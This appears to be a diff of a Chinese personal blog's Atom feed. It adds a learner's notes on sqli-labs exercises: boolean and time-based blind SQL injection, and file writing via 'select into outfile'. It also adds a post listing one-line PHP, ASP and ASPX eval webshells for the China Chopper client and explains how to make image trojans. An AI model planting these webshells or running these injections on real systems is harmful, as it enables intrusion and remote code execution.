@@ -3,29 +3,73 @@
     <id>http://example.com</id>
     <title>夜殿下的博客 • Posts by &#34;个人经验&#34; tag</title>
     <link href="http://example.com" />
-    <updated>2022-01-21T13:54:51.000Z</updated>
+    <updated>2022-01-26T21:03:11.000Z</updated>
     <category term="个人经验" />
     <category term="乱七八糟" />
     <category term="学习小结" />
-    <category term="less 1" />
     <category term="个人感慨" />
+    <category term="less 1" />
     <category term="知识小结" />
     <entry>
-        <id>http://example.com/2022/01/21/less5-less6%E7%9A%84%E6%89%8B%E5%8A%A8%E6%93%8D%E4%BD%9C/</id>
-        <title>less5~less6的手动操作</title>
-        <link rel="alternate" href="http://example.com/2022/01/21/less5-less6%E7%9A%84%E6%89%8B%E5%8A%A8%E6%93%8D%E4%BD%9C/"/>
-        <content type="html">&lt;p&gt;在 less 5 这关时，会发现按照之前的方法输入？id=1’–+，他并不会给你想要的信息，而是会回显 you are in&lt;/p&gt;
+        <id>http://example.com/2022/01/27/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E7%9A%84%E7%AE%80%E6%98%93%E6%89%8B%E5%8A%A8%E6%93%8D%E4%BD%9C/</id>
+        <title>布尔盲注和时间盲注的简易手动操作</title>
+        <link rel="alternate" href="http://example.com/2022/01/27/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%92%8C%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E7%9A%84%E7%AE%80%E6%98%93%E6%89%8B%E5%8A%A8%E6%93%8D%E4%BD%9C/"/>
+        <content type="html">&lt;p&gt; 在less 5这关时，会发现按照之前的方法输入?id=1’–+，他并不会给你想要的信息，而是会回显you are in&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://sm.ms/image/fBMIk3NUyjdrwtF&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/01/21/fBMIk3NUyjdrwtF.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;可以判断，该处注入方式为布尔盲注（即只有正确了只回显 you are in）&lt;/p&gt;
-&lt;p&gt;此处可以用 length (database ())=? 来推出 database 数据库的库名有几个字符长度&lt;/p&gt;
+&lt;p&gt; 可以判断，该处注入方式为布尔盲注（即只有正确了只回显you are in）&lt;/p&gt;
+&lt;p&gt; 此处可以用length(database())=?来推出database数据库的库名有几个字符长度&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://sm.ms/image/nQZ5XT8pDf1bA34&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/01/21/nQZ5XT8pDf1bA34.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;而后可根据二分法 ascii (substr (database ()))=?（&amp;gt;? 或 &amp;lt;?）来推断库名&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://sm.ms/image/VTzI9HZwkAKmhC8&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/01/21/VTzI9HZwkAKmhC8.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;less 6 是基于 less 5 的基础上，由单引号闭合改为了双引号闭合&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://sm.ms/image/HDB7CnPb3hZXp8V&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/01/21/HDB7CnPb3hZXp8V.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt; 而后可根据二分法ascii(substr(database()))=?（&amp;gt;? 或 &amp;lt;?）来推断库名&lt;/p&gt;
+&lt;p&gt; &lt;em&gt;PS.其中substr括号内是数据库查找方式，也可以是查表查列查字段，详见less1&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt; &lt;a href=&#34;https://sm.ms/image/VTzI9HZwkAKmhC8&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/01/21/VTzI9HZwkAKmhC8.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt; less 6是基于less 5的基础上，由单引号闭合改为了双引号闭合&lt;/p&gt;
+&lt;p&gt; &lt;a href=&#34;https://sm.ms/image/HDB7CnPb3hZXp8V&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/01/21/HDB7CnPb3hZXp8V.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt; &lt;strong&gt;if函数使用&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt; if(条件,正确回显,错误回显)&lt;/p&gt;
+&lt;p&gt; &lt;a href=&#34;https://sm.ms/image/5v2WN1z6pKdkfbX&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/01/27/5v2WN1z6pKdkfbX.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt; &lt;strong&gt;sleep睡眠使用&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt; &lt;a href=&#34;https://sm.ms/image/vPkOWYBQ35XRnAw&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/01/27/vPkOWYBQ35XRnAw.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt; 如图可知，程序运行（睡眠）了5s。&lt;/p&gt;
+&lt;p&gt; 之后的第八关和第九关、第十关，均可用if和sleep来手动操作（区别就是id=1后的闭合符合不同，详见第less 1~4。&lt;/p&gt;
 </content>
         <category term="个人经验" />
-        <updated>2022-01-21T13:54:51.000Z</updated>
+        <updated>2022-01-26T21:03:11.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://example.com/2022/01/25/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E4%BB%A5%E5%8F%8A%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%B0%8F%E8%A7%81%E8%A7%A3/</id>
+        <title>文件传输以及一句话木马的小见解</title>
+        <link rel="alternate" href="http://example.com/2022/01/25/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E4%BB%A5%E5%8F%8A%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%B0%8F%E8%A7%81%E8%A7%A3/"/>
+        <content type="html">&lt;p&gt; &lt;strong&gt;一句话木马的总结：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt; php型：&lt;?php @eval($_POST[&#39;ydx&#39;]);?&gt;&lt;/p&gt;
+&lt;p&gt; asp型：&amp;lt;%eval request(“ydx”)%&amp;gt;&lt;/p&gt;
+&lt;p&gt;aspx型：&amp;lt;%@ page Language=”Jscript”%&amp;gt; &amp;lt;%eval(Request.Item[“ydx”],”unsafe”);%&amp;gt;&lt;/p&gt;
+&lt;p&gt; 其中ydx为密码，即可在中国菜刀中输入使用&lt;/p&gt;
+&lt;p&gt; &lt;a href=&#34;https://sm.ms/image/sXaGIPkK9FfTbQJ&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/01/26/sXaGIPkK9FfTbQJ.png&#34; &gt;&lt;/a&gt; eval（）为函数，括号内即要执行的代码&lt;/p&gt;
+&lt;p&gt; @表示不报错，即就算执行错误，也不报错&lt;/p&gt;
+&lt;p&gt; 传输数据的两种方法：get、post&lt;/p&gt;
+&lt;p&gt; 其中get是在信息头的url路径下中存放数据&lt;/p&gt;
+&lt;p&gt; 而post是在消息体中存放数据&lt;/p&gt;
+&lt;p&gt; &lt;strong&gt;图片木马的生成&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt; &lt;a href=&#34;https://sm.ms/image/287otRTsdCibGQa&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/01/27/287otRTsdCibGQa.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt; 其中b表示二进制文件（+后即要覆盖进图片的木马）&lt;/p&gt;
+&lt;p&gt; a表示ASCLL码文件（a后即生成的图片木马）&lt;/p&gt;
+&lt;p&gt; &lt;strong&gt;Less 7&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt; 先登入进mysql命令行，输入show variables like ‘secure%’查看是否开启文件读写权限&lt;/p&gt;
+&lt;p&gt; &lt;a href=&#34;https://sm.ms/image/kjva5tUOPKHoAuQ&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/01/27/kjva5tUOPKHoAuQ.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt; 若为NULL即为没有权限，此时需到mysql文件夹中，找到对应的my.ini文件，在其中加入&lt;a href=&#34;https://sm.ms/image/WivGrl437YkceOC&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/01/27/WivGrl437YkceOC.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt; 之后重启mysql服务（这里并不是关闭运行指令框，而是关闭mysql服务再重启，再开指令框）&lt;/p&gt;
+&lt;p&gt; 可看到NULL变成你输入的地址&lt;/p&gt;
+&lt;p&gt; &lt;a href=&#34;https://sm.ms/image/yLajvJ9Xh2ZE4fR&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/01/27/yLajvJ9Xh2ZE4fR.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt; 此时可用上图所示方法使用select ’‘ into outfile ’‘；函数进行文件的上传&lt;/p&gt;
+&lt;p&gt; select后’ ‘内表示要上传的文件内容，outfile后’ ‘内表示文件上传的地址，最后是所上传文件的名称和格式（此处用\是因为\容易报错，不推荐使用）&lt;/p&gt;
+&lt;p&gt; 上传成功之后可以select load_file函数查看文件内容&lt;/p&gt;
+&lt;p&gt; &lt;a href=&#34;https://sm.ms/image/7BQacsHXRNkfAeo&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/01/27/7BQacsHXRNkfAeo.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt; 其中(‘  ‘)内即文件地址和所要读取的文件名&lt;/p&gt;
+&lt;p&gt; 在less 7中上传文件&lt;a href=&#34;https://sm.ms/image/5AQTEOoHUj6L847&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://s2.loli.net/2022/01/27/5AQTEOoHUj6L847.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt; 虽然回显说有一个sql语法错误，但翻看Less 7的目录，会发现文件已传输成功。&lt;/p&gt;
+</content>
+        <category term="个人经验" />
+        <updated>2022-01-25T15:22:12.000Z</updated>
     </entry>
     <entry>
         <id>http://example.com/2021/10/21/%E5%85%B3%E4%BA%8Eless%202%E5%88%B0less%204%E7%9A%84%E5%B0%8F%E6%80%BB%E7%BB%93/</id>
@@ -33,17 +77,17 @@
         <link rel="alternate" href="http://example.com/2021/10/21/%E5%85%B3%E4%BA%8Eless%202%E5%88%B0less%204%E7%9A%84%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
         <content type="html">&lt;p&gt;&lt;a href=&#34;https://sm.ms/image/3FQCeWsd7aivnBI&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://i.loli.net/2021/10/21/3FQCeWsd7aivnBI.jpg&#34; &gt;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://sm.ms/image/AWe683cGfxhyN9q&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://i.loli.net/2021/10/21/AWe683cGfxhyN9q.jpg&#34; &gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;通过对比 less 1 和 less 2，在输入？id=1’时报错信息的不同可以看出 less 1 是 near&amp;quot;1&amp;quot;, 而 less 2 是 near’’。因此在执行指令时，less 2 比 less 1 在 sql 语法报错上少了一个’。&lt;/p&gt;
-&lt;p&gt;以查列指令为例：&lt;/p&gt;
+&lt;p&gt;  通过对比less 1和less 2，在输入?id=1’时报错信息的不同可以看出less 1是near”1”,而less 2是near’’。因此在执行指令时，less 2比less 1在sql语法报错上少了一个’。&lt;/p&gt;
+&lt;p&gt;  以查列指令为例：&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://sm.ms/image/eJpKRTFruAvjG9t&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://i.loli.net/2021/10/21/eJpKRTFruAvjG9t.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;同理，在 less 3 的时候报错信息为&lt;/p&gt;
+&lt;p&gt;  同理，在less 3的时候报错信息为&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://sm.ms/image/AXgrWo24IseNyqU&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://i.loli.net/2021/10/21/AXgrWo24IseNyqU.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;即需要我们输入？id=1’) 才可成功执行之后的 sql 注入指令&lt;a href=&#34;https://sm.ms/image/1pHMoOJKui3cNmE&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://i.loli.net/2021/10/21/1pHMoOJKui3cNmE.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;less 4&lt;/p&gt;
+&lt;p&gt;  即需要我们输入?id=1’)才可成功执行之后的sql注入指令&lt;a href=&#34;https://sm.ms/image/1pHMoOJKui3cNmE&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://i.loli.net/2021/10/21/1pHMoOJKui3cNmE.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;  less 4&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://sm.ms/image/are9OcdXmiDqTFs&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://i.loli.net/2021/10/21/are9OcdXmiDqTFs.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;显示需输入？id=1&amp;quot; 才可执行后续命令，且需使前面的内容报错，才可执行（有点不理解，因为有时候没报错也可以执行）&lt;a href=&#34;https://sm.ms/image/7HAad3kZfTLYtqM&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://i.loli.net/2021/10/21/7HAad3kZfTLYtqM.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;后续的操作均与 less 1 一样。&lt;/p&gt;
-&lt;p&gt;总结：当发现 SQL 语法错误漏洞时，得弄清是什么样的错误漏洞，并根据实际情况进行调整。&lt;/p&gt;
+&lt;p&gt;  显示需输入?id=1”才可执行后续命令，且需使前面的内容报错，才可执行（有点不理解，因为有时候没报错也可以执行）&lt;a href=&#34;https://sm.ms/image/7HAad3kZfTLYtqM&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://i.loli.net/2021/10/21/7HAad3kZfTLYtqM.png&#34; &gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;  后续的操作均与less 1一样。&lt;/p&gt;
+&lt;p&gt;  总结：当发现SQL语法错误漏洞时，得弄清是什么样的错误漏洞，并根据实际情况进行调整。&lt;/p&gt;
 </content>
         <category term="个人经验" />
         <updated>2021-10-21T08:18:43.000Z</updated>
@@ -53,10 +97,10 @@
         <title>关于自己第一次换主题和发博客的一些看法</title>
         <link rel="alternate" href="http://example.com/2021/09/20/%E5%85%B3%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8D%A2%E4%B8%BB%E9%A2%98%E5%92%8C%E5%8F%91%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9C%8B%E6%B3%95/"/>
         <content type="html">&lt;p&gt;No.1  小白刚开始换主题的时候，不要追求好看（因为好看的主题配置都不大容易）&lt;/p&gt;
-&lt;p&gt;No.2  分清下载 theme 文件目录根里的配置文件（_config.yml）和 blog 文件目录根里的配置文件的区别，theme 里的配置文件是弄到时候博客界面里的内容，blog 里的配置文件里是定位 theme 文件（配置文件的 theme: **, 需要改成你下载的主题名）和博客网站的一些东西。&lt;/p&gt;
-&lt;p&gt;No.3  博客网站里的东西都在后台的数据库，如果有什么想要换的文字或者图片，可以在 blog 文件里找到相应的进行替换（但是图片的名字和格式不能改，因为改了到时候配置信息也得跟着改，不然无法读取）。&lt;/p&gt;
-&lt;p&gt;No.4  想改 blog 文件的时候，可以复制 blog 在其他磁盘先进行测试，测试成功再替换原本的 blog 文件（防止到时候改错乱码，又要补救，改来改去）&lt;/p&gt;
-&lt;p&gt;No.5  发博客的时候，记得在 tags: *******(冒号要英文的冒号。不要忘了中间的空格，不然上传不了远台仓库)。&lt;/p&gt;
+&lt;p&gt;No.2  分清下载theme文件目录根里的配置文件（_config.yml）和blog文件目录根里的配置文件的区别，theme里的配置文件是弄到时候博客界面里的内容，blog里的配置文件里是定位theme文件（配置文件的theme: **,需要改成你下载的主题名）和博客网站的一些东西。&lt;/p&gt;
+&lt;p&gt;No.3  博客网站里的东西都在后台的数据库，如果有什么想要换的文字或者图片，可以在blog文件里找到相应的进行替换（但是图片的名字和格式不能改，因为改了到时候配置信息也得跟着改，不然无法读取）。&lt;/p&gt;
+&lt;p&gt;No.4  想改blog文件的时候，可以复制blog在其他磁盘先进行测试，测试成功再替换原本的blog文件（防止到时候改错乱码，又要补救，改来改去）&lt;/p&gt;
+&lt;p&gt;No.5  发博客的时候，记得在tags: *******(冒号要英文的冒号。不要忘了中间的空格，不然上传不了远台仓库)。&lt;/p&gt;
 </content>
         <category term="个人经验" />
         <updated>2021-09-20T15:03:02.000Z</updated>
